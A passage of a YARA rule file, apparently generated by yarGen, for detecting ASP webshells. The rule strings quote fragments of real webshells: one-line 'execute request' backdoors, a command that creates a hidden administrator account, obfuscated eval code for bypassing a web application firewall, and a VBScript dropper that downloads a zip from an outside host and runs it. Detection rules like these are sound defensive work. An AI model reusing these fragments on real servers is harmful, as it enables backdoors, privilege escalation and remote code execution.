      $s13 = "74H45H6EH64H28H29H3BH78H2EH6DH6FH76H65H4EH65H78H74H28H29H29H20H7BH76H61H72H20H6FH44H72H69H76H65H72H20H3DH20H78H2EH69H74H65H6DH28" ascii
      $s14 = "H46H69H6CH65H53H79H73H74H65H6DH4FH62H6AH65H63H74H22H29H3BH76H61H72H20H6FH44H72H69H76H65H72H73H20H3DH20H6FH46H73H6FH2EH44H72H69H7" ascii
      $s15 = "H6EH22H3BH7DH0AH66H75H6EH63H74H69H6FH6EH20H62H66H69H28H66H29H7BH53H2BH3DH66H2EH4EH61H6DH65H2BH22H5CH74H22H2BH66H2EH44H61H74H65H4" ascii
      $s16 = "76H65H58H4FH62H6AH65H63H74H28H22H53H63H72H69H70H74H69H6EH67H2EH46H69H6CH65H53H79H73H74H65H6DH4FH62H6AH65H63H74H22H29H3BH0AH66H73" ascii
      $s17 = "7BH78H69H65H2BH3DH22Hu5220Hu9664Hu5931Hu8D25H21H7CH3CH2DH22H3BH7DH0AH7DH0AH76H61H72H20H78H69H65H3DH22H2DH3EH7CH22H3BH0AH77H6AH6A" ascii
      $s18 = "69H6CH65H53H79H73H74H65H6DH4FH62H6AH65H63H74H22H29H3BH0AH66H75H6EH63H74H69H6FH6EH20H77H6AH6AH28H62H29H7BH0AH76H61H72H20H63H3DH6E" ascii
      $s19 = "BH0AH66H6FH72H20H28H3BH21H63H2EH61H74H45H6EH64H28H29H3BH63H2EH6DH6FH76H65H4EH65H78H74H28H29H29H62H66H6FH28H63H2EH69H74H65H6DH28H" ascii
      $s20 = "2BH66H2EH44H61H74H65H4CH61H73H74H4DH6FH64H69H66H69H65H64H2BH22H5CH74H30H5CH74H22H2BH66H2EH41H74H74H72H69H62H75H74H65H73H2BH22H5C" ascii
   condition:
      uint16(0) == 0x533c and filesize < 10KB and
      8 of them
}

rule 4_0 {
   meta:
      description = "webshell - file 4.0.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $x2 = "j cdx&\"<a href='http://mytool.chinaz.com/baidusort.aspx?host=\"&str1&\"&sortType=0' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s3 = "j cdx&\"<a href='http://www.odayexp.com/h4cker/tuoku/' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s4 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s5 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s6 = "j cdx&\"<a href='http://odayexp.com/h4cker/sql/' target='FileFrame'>\"&cxd&\" SQL---" fullword ascii
      $s7 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
      $s8 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s9 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
      $s10 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s11 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s12 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s13 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s14 = "j cdx&\"<a href='?Action=hiddenshell' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s15 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s16 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s17 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s18 = "j cdx&\"<a href='?Action=ReadREG' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s19 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s20 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_2013110125027897 {
   meta:
      description = "webshell - file 2013110125027897.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $s2 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s3 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s4 = "j cdx&\"<a href='http://tool.chinaz.com/baidu/?wd=\"&str1&\"&lm=0&pn=0' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s5 = "'j cdx&\"<a href='http://www.8090sec.com/SQL/index.aspx' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s6 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
      $s7 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s8 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
      $s9 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s10 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s11 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s12 = "j cdx&\"<a href='?Action=hiddenshell' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s13 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s14 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s15 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s16 = "j cdx&\"<a href='?Action=ReadREG' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s17 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s18 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s19 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s20 = "<a href='?Action=cmdx' target='FileFrame'> <font color=red> " fullword ascii
   condition:
      uint16(0) == 0x6f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule 4_0__1_ {
   meta:
      description = "webshell - file 4.0 (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $x2 = "j cdx&\"<a href='http://mytool.chinaz.com/baidusort.aspx?host=\"&str1&\"&sortType=0' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s3 = "j cdx&\"<a href='http://www.odayexp.com/h4cker/tuoku/' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s4 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s5 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s6 = "j cdx&\"<a href='http://odayexp.com/h4cker/sql/' target='FileFrame'>\"&cxd&\" SQL---" fullword ascii
      $s7 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
      $s8 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s9 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
      $s10 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s11 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s12 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s13 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s14 = "j cdx&\"<a href='?Action=hiddenshell' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s15 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s16 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s17 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s18 = "j cdx&\"<a href='?Action=ReadREG' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s19 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s20 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule _2014 {
   meta:
      description = "webshell - file _2014.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $s2 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
      $s3 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s4 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
      $s5 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s6 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><a href=http://\"&siteurl&\" target=_blan" ascii
      $s7 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s8 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s9 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s10 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s11 = "txen emuser rorre no" fullword ascii /* reversed goodware string 'on error resume next' */
      $s12 = "    TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls" ascii
      $s13 = " txen emuser rorre no" fullword ascii /* reversed goodware string 'on error resume next ' */
      $s14 = "    TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls" ascii
      $s15 = "surivitna" fullword ascii /* reversed goodware string 'antivirus' */
      $s16 = "nottuboidar" fullword ascii /* reversed goodware string 'radiobutton' */
      $s17 = "RndFilename = \"\\temp\" & Day(now) & Hour(now) & Minute(now) & Second(now) & \".tmp\"" fullword ascii
      $s18 = ":ExeCuTe(ShiSanFun(ShiSan)):" fullword ascii
      $s19 = "txeN emuseR rorrE nO" fullword ascii /* reversed goodware string 'On Error Resume Next' */
      $s20 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule _2012 {
   meta:
      description = "webshell - file _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
      $s2 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
      $s3 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s4 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
      $s5 = "strBAD=strBAD&\"If Session(\"\"#\"\")<>\"\"\"\" Then Execute(Session(\"\"#\"\"))\"" fullword ascii
      $s6 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><a href=http://\"&siteurl&\" target=_blan" ascii
      $s7 = "tpircsw" fullword ascii /* reversed goodware string 'wscript' */
      $s8 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s9 = "j\" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add" ascii
      $s10 = "raelC.rrE" fullword ascii /* reversed goodware string 'Err.Clear' */
      $s11 = "txen emuser rorre no" fullword ascii /* reversed goodware string 'on error resume next' */
      $s12 = "    TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls" ascii
      $s13 = " txen emuser rorre no" fullword ascii /* reversed goodware string 'on error resume next ' */
      $s14 = "    TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls" ascii
      $s15 = "surivitna" fullword ascii /* reversed goodware string 'antivirus' */
      $s16 = "nottuboidar" fullword ascii /* reversed goodware string 'radiobutton' */
      $s17 = "RndFilename = \"\\temp\" & Day(now) & Hour(now) & Minute(now) & Second(now) & \".tmp\"" fullword ascii
      $s18 = ":ExeCuTe(ShiSanFun(ShiSan)):" fullword ascii
      $s19 = "txeN emuseR rorrE nO" fullword ascii /* reversed goodware string 'On Error Resume Next' */
      $s20 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_aspmuma {
   meta:
      description = "webshell - file aspmuma.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8054e1a3a6245488b57c2a7ea235ebe2b81a3e73d96e10c1c732223754e5788d"
   strings:
      $s1 = "SItEuRl=http://asp-muma.com/\" '" fullword ascii
      $s2 = "Http.setRequestHeader \"CONTENT-TYPE\", \"application/x-www-form-urlencoded\" " fullword ascii
      $s3 = "Http.open \"GET\",url,false " fullword ascii
      $s4 = "bg =\"http://www.7jyewu.cn/webshell/asp.jpg\" " fullword ascii
      $s5 = "execute aspCode" fullword ascii
      $s6 = "PostHTTPPage=bytesToBSTR(Http.responseBody,\"gbk\") " fullword ascii
      $s7 = "aspCode=PostHTTPPage(Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 119 ) " ascii
      $s8 = "aspCode=PostHTTPPage(Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 119 ) " ascii
      $s9 = "function PostHTTPPage(url) " fullword ascii
      $s10 = "<%@ LANGUAGE = VBScript.encode%><%" fullword ascii
      $s11 = "if Http.readystate<>4 then " fullword ascii
      $s12 = "Http.send " fullword ascii
      $s13 = "UserPass=\"admin\"  '" fullword ascii
      $s14 = "objstream.Charset = Cset " fullword ascii
      $s15 = "objstream.Mode =3 " fullword ascii
      $s16 = "objstream.Close " fullword ascii
      $s17 = "objstream.Type = 1 " fullword ascii
      $s18 = "objstream.Write body " fullword ascii
      $s19 = "objstream.Position = 0 " fullword ascii
      $s20 = "objstream.Open " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      8 of them
}

rule webshell_asp_mdb {
   meta:
      description = "webshell - file mdb.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a905652bd675eadfda2ba649a4bd69d036dc6fa0dc48b80a2010dbfac72a27da"
   strings:
      $s1 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL#Visual Basic For Applic" wide
      $s2 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide
      $s3 = "<% execute request(\"a\")%>a" fullword ascii
      $s4 = "<% execute request(\"ice\")%>a " fullword ascii
      $s5 = "VVVVVVVT " fullword wide /* base64 encoded string 'UUUUUS' */
      $s6 = "*\\G{4AFFC9A0-5F99-101B-AF4E-00AA003F0F07}#9.0#0#F:\\MicroSoft\\Office\\Office15\\MSACC.OLB#Microsoft Access 14.0 Object Library" wide
      $s7 = " shell" fullword ascii
      $s8 = "Name=\"shell\"" fullword ascii
      $s9 = "0#0#C:\\W" fullword ascii
      $s10 = "MSysAccessStorage_ROOT" fullword wide
      $s11 = "GUID8DisplayViewsOnSharePointSite" fullword wide
      $s12 = "NavPane Closed" fullword wide
      $s13 = "shellV" fullword ascii
      $s14 = "vvvvvvvt " fullword wide
      $s15 = "xxxxxxxv " fullword wide
      $s16 = "Project1" fullword ascii
      $s17 = "rstdol" fullword ascii
      $s18 = "888,,,,,,,* " fullword wide
      $s19 = "PROJECTwm" fullword wide /* Goodware String - occured 30 times */
      $s20 = "_VBA_PROJECT" fullword wide /* Goodware String - occured 30 times */
   condition:
      uint16(0) == 0x0100 and filesize < 700KB and
      8 of them
}

rule bypass_waf {
   meta:
      description = "webshell - file bypass-waf.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6ef0c236c9f93dd12dc73f135d5672e8f89e7af2ffbea7f2a500c5a2acfa843c"
   strings:
      $s1 = " pass waf -->" fullword ascii
      $s2 = "<!-- yes++ -->" fullword ascii
      $s3 = "x1 = request(\"pass\") " fullword ascii
      $s4 = "eval x2 " fullword ascii
      $s5 = "x2 = x1 " fullword ascii
      $s6 = "dim x1,x2 " fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule webshell_asp_a {
   meta:
      description = "webshell - file a.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "352465776c8ae0a89380e3c4455970217be5e7ac8289376d9c8d75bb54d6f2c2"
   strings:
      $s1 = "<!-- yes++ -->" fullword ascii
      $s2 = "eval x2 " fullword ascii
      $s3 = "x1 = request(\"h\") " fullword ascii
      $s4 = "x2 = x1 " fullword ascii
      $s5 = "dim x1,x2 " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule bypass_safedog_02 {
   meta:
      description = "webshell - file bypass_safedog_02.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ac37768b953d2bc5c1704f4225a9b1d0d7cc21cc30814dab1014c886100bc749"
   strings:
      $s1 = "<%@ Page Language = Jscript %>" fullword ascii
      $s2 = "\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u\"+\"e\"/*-/*-*/+\"s\"+\"t\"+" fullword ascii
      $s3 = "\",\"+\"\\\"\"+\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"+\"\\\"\"+\")\";eval" fullword ascii
      $s4 = "(/*-/*-*/P/*-/*-*/,/*-/*-*/\"u\"+\"n\"+\"s\"/*-/*-*/+\"a\"+\"f\"+\"e\"/*-/*-*/);%>" fullword ascii
      $s5 = "\"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]\"+" fullword ascii
      $s6 = "<%var/*-/*-*/P/*-/*-*/=/*-/*-*/\"e\"+\"v\"+/*-/*-*/" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule use_html_annotator_bypass {
   meta:
      description = "webshell - file use-html-annotator-bypass.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8e8bb2ff63baa5f257e7f498d368796bdf61b417a7b21add21e5a482001f4536"
   strings:
      $s1 = "execute request(\"LandGrey\")" fullword ascii
      $s2 = "<!--\"-->" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_asp_Ajan {
   meta:
      description = "webshell - file Ajan.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dcc843550c34495f4c7b90c6e6bdf2a537e8837b17c4ebe802067c5fee6f715a"
   strings:
      $s1 = "WshShell.Run \"c:\\net.vbs\", 0, false" fullword ascii
      $s2 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOverWrite\" & vbcrlf" fullword ascii
      $s3 = "entrika.write \"WshShell.Run \"\"c:\\downloaded.zip\"\", 0, false\" & vbcrlf" fullword ascii
      $s4 = "entrika.write \"xml.Open \"\"GET\"\",\"\"http://www35.websamba.com/cybervurgun/file.zip\"\",False\" & vbcrlf" fullword ascii
      $s5 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword ascii
      $s6 = "entrika.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword ascii
      $s7 = "Set entrika = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s8 = " </SCRIPT>" fullword ascii
      $s9 = "Dim WshShell" fullword ascii
      $s10 = "entrika.write \"Dim WshShell\"  & vbcrlf" fullword ascii
      $s11 = "entrika.close" fullword ascii
      $s12 = "entrika.write \"BinaryStream.Write BinaryData\" & vbcrlf" fullword ascii
      $s13 = "entrika.write \"Set xml = CreateObject(\"\"Microsoft.XMLHTTP\"\")\" & vbcrlf" fullword ascii
      $s14 = "entrika.write \"Dim BinaryData\" & vbcrlf" fullword ascii
      $s15 = "entrika.write \"Const adTypeBinary = 1\" & vbcrlf" fullword ascii
      $s16 = "entrika.write \"Dim BinaryStream\" & vbcrlf" fullword ascii
      $s17 = "entrika.write \"Set BinaryStream = CreateObject(\"\"ADODB.Stream\"\")\" & vbcrlf" fullword ascii
      $s18 = "entrika.write \"BinaryStream.Type = adTypeBinary\" & vbcrlf" fullword ascii
      $s19 = "entrika.write \"BinaryData = xml.ResponsebOdy\" & vbcrlf" fullword ascii
      $s20 = "entrika.write \"BinaryStream.Open\" & vbcrlf" fullword ascii
   condition:
      uint16(0) == 0x533c and filesize < 3KB and
      8 of them
}

rule webshell_asp_ajn {
   meta:
      description = "webshell - file ajn.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9339bd6cf23b8883fd5adc5f2813145689f0b4e081d355a91e52ffc75209238c"
   strings:
      $s1 = "WshShell.Run \"c:\\net.vbs\", 0, false" fullword ascii
      $s2 = "seal.write \"xml.Open \"\"GET\"\",\"\"http://www35.websamba.com/cybervurgun/file.zip\"\",False\" & vbcrlf" fullword ascii
      $s3 = "seal.write \"WshShell.Run \"\"c:\\downloaded.zip\"\", 0, false\" & vbcrlf" fullword ascii
      $s4 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOverWrite\" & vbcrlf" fullword ascii
      $s5 = "Set seal = seal.CreateTextFile(\"c:\\net.vbs\", True)" fullword ascii
      $s6 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword ascii
      $s7 = " </SCRIPT>" fullword ascii
      $s8 = "Set seal = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s9 = "Dim WshShell" fullword ascii
      $s10 = "seal.write \"Dim WshShell\"  & vbcrlf" fullword ascii
      $s11 = "seal.close" fullword ascii
      $s12 = "seal.write \"Set BinaryStream = CreateObject(\"\"ADODB.Stream\"\")\" & vbcrlf" fullword ascii
      $s13 = "seal.write \"Set xml = CreateObject(\"\"Microsoft.XMLHTTP\"\")\" & vbcrlf" fullword ascii
      $s14 = "seal.write \"Dim BinaryStream\" & vbcrlf" fullword ascii
      $s15 = "seal.write \"BinaryStream.Open\" & vbcrlf" fullword ascii
      $s16 = "seal.write \"Const adTypeBinary = 1\" & vbcrlf" fullword ascii
      $s17 = "seal.write \"BinaryStream.Type = adTypeBinary\" & vbcrlf" fullword ascii
      $s18 = "seal.write \"Dim BinaryData\" & vbcrlf" fullword ascii
      $s19 = "seal.write \"BinaryStream.Write BinaryData\" & vbcrlf" fullword ascii
      $s20 = "seal.write \"BinaryData = xml.ResponsebOdy\" & vbcrlf" fullword ascii
   condition:
      uint16(0) == 0x533c and filesize < 3KB and
      8 of them
}

rule webshell_asp_zehir {
   meta:
      description = "webshell - file zehir.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
   strings:
      $s1 = "frames.byZehir.document.execCommand('InsertImage', false, imagePath);" fullword ascii
      $s2 = "frames.byZehir.document.execCommand(command, false, option);" fullword ascii
      $s3 = "response.Write \"<title>[AhmetDeniz.Org] ZehirIV --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>\"" fullword ascii
      $s4 = "objConn.Execute strSQL" fullword ascii
      $s5 = "<SCRIPT SRC=http://www.shellci.biz/yazciz/ciz.js></SCRIPT>" fullword ascii
      $s6 = "Response.Write \"<tr><td><b><font color=red>User Agent</td><td> \" & request.servervariables(\"HTTP_USER_AGENT\") & \"</td></tr>" ascii
      $s7 = "Response.Write \"<form method=get target='_opener' action='\"&DosyPath&\"'>\"" fullword ascii
      $s8 = "Response.Write \"<center><img ALT='zehirhacker@hotmail.com / zehirhacker@hotmail.com' src='\"&resimYol(path)&\"'></center><br>\"" ascii
      $s9 = "MyFile.write \"byzehir <zehirhacker@hotmail.com>\"" fullword ascii
      $s10 = "Response.Write \"<form method=get action='\"&DosyPath&\"' target='_opener' id=form1 name=form1>\"" fullword ascii
      $s11 = "response.Write \"<br><br><font style='FONT-WEIGHT:normal' size=2>zehirhacker@hotmail.com<br><font color=yellow face='courier new" ascii
      $s12 = "response.Write \"<br><br><font style='FONT-WEIGHT:normal' size=2>zehirhacker@hotmail.com<br><font color=yellow face='courier new" ascii
      $s13 = "targetPath=objUpload.Fields(\"folder\").Value" fullword ascii
      $s14 = "llngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2" fullword ascii
      $s15 = "Response.Write \"<tr><td><b><font color=red>Log Root</td><td> \" & request.servervariables(\"APPL_MD_PATH\") & \"</td></tr>\"" fullword ascii
      $s16 = "Public ContentType" fullword ascii
      $s17 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)" fullword ascii
      $s18 = "Public Property Get Count()" fullword ascii
